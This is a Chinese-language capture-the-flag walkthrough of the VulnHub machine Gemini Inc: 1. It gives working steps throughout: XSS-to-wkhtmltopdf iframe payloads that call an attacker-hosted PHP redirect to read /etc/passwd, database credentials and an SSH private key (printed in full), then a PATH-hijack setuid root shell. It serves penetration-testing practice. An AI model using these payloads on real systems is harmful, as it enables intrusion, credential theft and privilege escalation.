靶机地址：[Gemini Inc: 1 ~ VulnHub](https://www.vulnhub.com/entry/gemini-inc-1,227/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.48
sudo nmap -p "22,80" -sV 192.168.1.48
# 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.25
```
简单看了下web服务，有一些提示和一个登录入口，没发现什么其它特别的，路径扫描一下
```Shell
sudo dirsearch -u http://192.168.1.48
sudo dirsearch -u http://192.168.1.48/test2/
# /test2/inc/
# /test2/js/
# /test2/lib/
# /test2/login.php
# /test2/profile.php
```
首页上还说明了仓库位置：[ionutvmi/master-login-system:(github.com)](https://github.com/ionutvmi/master-login-system)
可以在其仓库中看到这段内容
```php
$sqls[] = "
INSERT INTO `".$prefix."users` (`userid`, `username`, `display_name`, `password`, `email`, `key`, `validated`, `groupid`, `lastactive`, `showavt`, `banned`, `regtime`) VALUES
(1, 'admin', 'Admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220', 'admin@gmail.com', '', '1', 4, ".time().", 1, 0, ".time().");";
```
即账号密码
```
admin
7110eda4d09e062aa5e4a390b0a572ac0d2c0220
```
经过搜索 `7110eda4d09e062aa5e4a390b0a572ac0d2c0220` 是 `1234` 经过 `sha1` 加密的
尝试通过 `admin:1234` 登录系统，成功了
简单看一下，只有查看、修改、导出个人信息等功能
修改昵称，发现存在XSS漏洞，而且还是存储型XSS，但是暂时没有什么利用角度
再看一下导出功能，有点儿慢，导出了半天，可能有问题
导出了一个PDF文件，查看属性，作者是wkhtmltopdf 0.12.4
是通过 `wkhtmltopdf` 库生成的PDF，查一下相关漏洞，可能存在文件包含，尝试一下
```html
<iframe src="file:///etc/passwd"></iframe>
```
失败了
```html
<iframe src="http://192.168.1.26:7331/test.txt"></iframe>
```
果然存在文件包含，而且是远程文件包含
尝试利用，服务端部署的恶意代码
`exp.php`
```PHP
<?php header('Location: file://'.$_REQUEST['file']); ?>
```
启动服务，必须通过PHP启动服务
```Shell
php -S 0.0.0.0:7331
```
XSS的Payload
```html
<iframe  width="800" height="800" src="http://192.168.1.26:7331/exp.php?file=/etc/passwd"></iframe>
```
成功利用漏洞读取到了文件，其中包含如下等内容
```
root:x:0:0:root:/root:/bin/bash
gemini1:x:1000:1000:gemini-sec,,,:/home/gemini1:/bin/bash
```
结合之前的信息收集，再换一个可能存有敏感信息的文件
```HTML
<iframe  width="800" height="800" src="http://192.168.1.26:7331/exp.php?file=/var/www/html/test2/inc/settings.php"></iframe>
```
内容如下
```php
<?php
$set->db_host = 'localhost';
$set->db_user = 'gemini2';
$set->db_pass = 'dbsuperpassword';
$set->db_name = 'geminiinc';
define('MLS_PREFIX', 'mls_');
?>
```
用这个密码尝试SSH，失败了
尝试获取私钥，这样也能登录系统
```HTML
<iframe  width="800" height="800" src="http://192.168.1.26:7331/exp.php?file=/home/gemini1/.ssh/id_rsa"></iframe>
```
成功获取
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAv8sYkCmUFupwQ8pXsm0XCAyxcR6m5y9GfRWmQmrvb9qJP3xs
6c11dX9Mi8OLBpKuB+Y08aTgWbEtUAkVEpRU+mk+wpSx54OTBMFX35x4snzz+X5u
Vl1rUn9Z4QE5SJpOvfV3Ddw9zlVA0MCJGi/RW4ODRYmPHesqNHaMGKqTnRmn3/4V
u7cl+KpPZmQJzASoffyBn1bxQomqTkb5AGhkAggsOPS0xv6P2g/mcmMUIRWaTH4Z
DqrpqxFtJbuWSszPhuw3LLqAYry0RlEH/Mdi2RxM3VZvqDRlsV0DO74qyBhBsq+p
oSbdwoXao8n7oO2ASHc05d2vtmmmGP31+4pjuQIDAQABAoIBAQCq+WuJQHeSwiWY
WS46kkNg2qfoNrIFD8Dfy0ful5OhfAiz/sC84HrgZr4fLg+mqWXZBuCVtiyF6IuD
eMU/Tdo/bUkUfyflQgbyy0UBw2RZgUihVpMYDKma3oqKKeQeE+k0MDmUsoyqfpeM
QMc3//67fQ6uE8Xwnu593FxhtNZoyaYgz8LTpYRsaoui9j7mrQ4Q19VOQ16u4XlZ
rVtRFjQqBmAKeASTaYpWKnsgoFudp6xyxWzS4uk6BlAom0teBwkcnzx9fNd2vCYR
MhK5KLTDvWUf3d+eUcoUy1h+yjPvdDmlC27vcvZ0GXVvyRks+sjbNMYWl+QvNIZn
1XxD1nkxAoGBAODe4NKq0r2Biq0V/97xx76oz5zX4drh1aE6X+osRqk4+4soLauI
xHaApYWYKlk4OBPMzWQC0a8mQOaL1LalYSEL8wKkkaAvfM604f3fo01rMKn9vNRC
1fAms6caNqJDPIMvOyYRe4PALNf6Yw0Hty0KowC46HHkmWEgw/pEhOZdAoGBANpY
AJEhiG27iqxdHdyHC2rVnA9o2t5yZ7qqBExF7zyUJkIbgiLLyliE5JYhdZjd+abl
aSdSvTKOqrxscnPmWVIxDyLDxemH7iZsEbhLkIsSKgMjCDhPBROivyQGfY17EHPu
968rdQsmJK8+X5aWxq08VzlKwArm+GeDs2hrCGUNAoGAc1G5SDA0XNz3CiaTDnk9
r0gRGGUZvU89aC5wi73jCttfHJEhQquj3QXCXM2ZQiHzmCvaVOShNcpPVCv3jSco
tXLUT9GnoNdZkQPwNWqf648B6NtoIA6aekrOrO5jgDks6jWphq9GgV1nYedVLpR7
WszupOsuwWGzSr0r48eJxD0CgYEAo23HTtpIocoEbCtulIhIVXj5zNbxLBt55NAp
U2XtQeyqDkVEzQK4vDUMXAtDWF6d5PxGDvbxQoxi45JQwMukA89QwvbChqAF86Bk
SwvUbyPzalGob21GIYJpi2+IPoPktsIhhm4Ct4ufXcRUDAVjRHur1ehLgl2LhP+h
JAEpUWkCgYEAj2kz6b+FeK+xK+FUuDbd88vjU6FB8+FL7mQFQ2Ae9IWNyuTQSpGh
vXAtW/c+eaiO4gHRz60wW+FvItFa7kZAmylCAugK1m8/Ff5VZ0rHDP2YsUHT4+Bt
j8XYDMgMA8VYk6alU2rEEzqZlru7BZiwUnz7QLzauGwg8ohv1H2NP9k=
-----END RSA PRIVATE KEY-----
```
将私钥写到文件 `id_rsa` 中，并赋予响应权限
```Shell
chmod 600 id_rsa
```
尝试直接通过私钥连接
```Shell
ssh gemini1@192.168.1.48 -i id_rsa
```
成功登录进系统，尝试信息收集和提权
```Shell
mysql -u "gemini2" -D "geminiinc" -p
# dbsuperpassword
```
看一下，除了一个密码Hash，没发现其它有用的信息
查找SUID文件
```Shell
find / -type f -user root -perm -u+sx -ls 2>/dev/null
# /usr/bin/listinfo
file /usr/bin/listinfo
# /usr/bin/listinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0f284a2f4f3c967c78816592da20f223e4ae2f10, not stripped
strings /usr/bin/listinfo
# /sbin/ifconfig | grep inet
# /bin/netstat -tuln | grep 22
# /bin/netstat -tuln | grep 80
# date
```
最终发现，其在执行date命令时没有指定路径，可以尝试通过修改环境变量，覆盖执行
```Shell
cd /tmp
mkdir exp
cd exp
vi exp.c
```
```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
```Shell
gcc exp.c -o date
rm exp.c
export PATH=/tmp/exp:$PATH
which date
```
尝试提权
```Shell
listinfo
```
提权成功

其它提权方式：[[20 CVE#CVE-2021-4034|CVE-2021-4034]] 
